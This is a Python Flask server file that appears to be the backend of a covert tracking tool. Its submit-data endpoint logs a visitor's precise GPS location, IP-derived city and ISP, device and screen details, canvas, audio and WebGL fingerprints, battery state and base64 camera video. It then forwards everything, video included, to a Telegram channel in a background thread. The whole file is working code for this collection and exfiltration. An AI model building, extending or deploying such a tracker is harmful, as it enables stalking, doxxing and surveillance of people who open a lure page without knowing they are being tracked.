import os
import json
import base64
import logging
import requests
from datetime import datetime
from flask import request, jsonify
from app import app, db
from models import LocationLog
from telegram_service import send_to_telegram

logger = logging.getLogger(__name__)

@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy', 
        'timestamp': datetime.utcnow().isoformat(),
        'version': '2.0.0'
    })

@app.route('/api/submit-data', methods=['POST', 'OPTIONS'])
def submit_data():
    """Handle location and device data submission"""
    
    # Handle preflight OPTIONS request
    if request.method == 'OPTIONS':
        return jsonify({'status': 'OK'}), 200
    
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({'error': 'No data received'}), 400
        
        # Extract IP and geolocation info
        ip_address = get_client_ip(request)
        geo_info = get_geo_info(ip_address)
        
        # Create log entry
        log_entry = LocationLog()
        
        # Location data
        location_data = data.get('location', {})
        log_entry.latitude = location_data.get('latitude')
        log_entry.longitude = location_data.get('longitude')
        log_entry.accuracy = location_data.get('accuracy')
        log_entry.altitude = location_data.get('altitude')
        log_entry.altitude_accuracy = location_data.get('altitudeAccuracy')
        log_entry.heading = location_data.get('heading')
        log_entry.speed = location_data.get('speed')
        log_entry.location_timestamp = location_data.get('timestamp')
        
        # Network and IP data
        log_entry.ip_address = ip_address
        log_entry.user_agent = request.headers.get('User-Agent', '')
        log_entry.country = geo_info.get('country')
        log_entry.city = geo_info.get('city')
        log_entry.region = geo_info.get('region')
        log_entry.isp = geo_info.get('isp')
        
        # Device information
        device_info = data.get('deviceInfo', {})
        log_entry.platform = device_info.get('platform')
        log_entry.language = device_info.get('language')
        log_entry.timezone = device_info.get('timezone')
        log_entry.cookie_enabled = device_info.get('cookieEnabled')
        log_entry.online_status = device_info.get('onLine')
        log_entry.hardware_concurrency = device_info.get('hardwareConcurrency')
        log_entry.max_touch_points = device_info.get('maxTouchPoints')
        log_entry.do_not_track = device_info.get('doNotTrack')
        log_entry.device_memory = device_info.get('deviceMemory')
        
        # Screen information
        screen_info = device_info.get('screen', {})
        log_entry.screen_width = screen_info.get('width')
        log_entry.screen_height = screen_info.get('height')
        log_entry.color_depth = screen_info.get('colorDepth')
        log_entry.pixel_depth = screen_info.get('pixelDepth')
        
        # Viewport information
        viewport_info = device_info.get('viewport', {})
        log_entry.viewport_width = viewport_info.get('width')
        log_entry.viewport_height = viewport_info.get('height')
        
        # Connection information
        connection_info = data.get('connectionInfo', {})
        log_entry.connection_type = connection_info.get('effectiveType')
        log_entry.connection_downlink = connection_info.get('downlink')
        log_entry.connection_rtt = connection_info.get('rtt')
        log_entry.connection_save_data = connection_info.get('saveData')
        
        # Battery information
        battery_info = data.get('batteryInfo', {})
        log_entry.battery_level = battery_info.get('level')
        log_entry.battery_charging = battery_info.get('charging')
        log_entry.battery_charging_time = battery_info.get('chargingTime')
        log_entry.battery_discharging_time = battery_info.get('dischargingTime')
        
        # Fingerprinting data
        log_entry.canvas_fingerprint = data.get('canvasFingerprint')
        log_entry.audio_fingerprint = data.get('audioFingerprint')
        
        webgl_info = data.get('webglInfo', {})
        log_entry.webgl_vendor = webgl_info.get('vendor')
        log_entry.webgl_renderer = webgl_info.get('renderer')
        log_entry.webgl_version = webgl_info.get('version')
        log_entry.webgl_shading_language_version = webgl_info.get('shadingLanguageVersion')
        
        # Video data
        video_data = data.get('videoData')
        if video_data:
            log_entry.has_video = True
            try:
                # Calculate video size from base64 data
                if video_data.startswith('data:'):
                    header, encoded_data = video_data.split(',', 1)
                    video_bytes = base64.b64decode(encoded_data)
                    log_entry.video_size = len(video_bytes)
                else:
                    log_entry.video_size = len(base64.b64decode(video_data))
            except:
                log_entry.video_size = 0
        
        # Save to database
        db.session.add(log_entry)
        db.session.commit()
        
        # Send to Telegram asynchronously
        import threading
        
        def send_async():
            with app.app_context():
                try:
                    success = send_to_telegram(log_entry, video_data)
                    log_entry.telegram_sent = success
                    if not success:
                        log_entry.error_message = "Failed to send to Telegram"
                    db.session.commit()
                    
                    if success:
                        logger.info(f"Successfully sent data to Telegram for log ID {log_entry.id}")
                    else:
                        logger.error(f"Failed to send data to Telegram for log ID {log_entry.id}")
                        
                except Exception as e:
                    logger.error(f"Error sending to Telegram: {str(e)}")
                    log_entry.error_message = str(e)
                    db.session.commit()
        
        # Start async sending
        thread = threading.Thread(target=send_async)
        thread.daemon = True
        thread.start()
        
        return jsonify({
            'success': True,
            'message': 'Data submitted successfully',
            'id': log_entry.id
        })
        
    except Exception as e:
        logger.error(f"Error processing data submission: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500

def get_client_ip(request):
    """Get the real client IP address"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    else:
        return request.remote_addr

def get_geo_info(ip_address):
    """Get geolocation information for an IP address"""
    try:
        # Using ip-api.com (free API)
        response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return {
                    'country': data.get('country'),
                    'city': data.get('city'),
                    'region': data.get('regionName'),
                    'isp': data.get('isp'),
                    'org': data.get('org'),
                    'as': data.get('as'),
                    'lat': data.get('lat'),
                    'lon': data.get('lon'),
                    'timezone': data.get('timezone')
                }
    except Exception as e:
        logger.error(f"Error getting geo info for {ip_address}: {str(e)}")
    
    return {}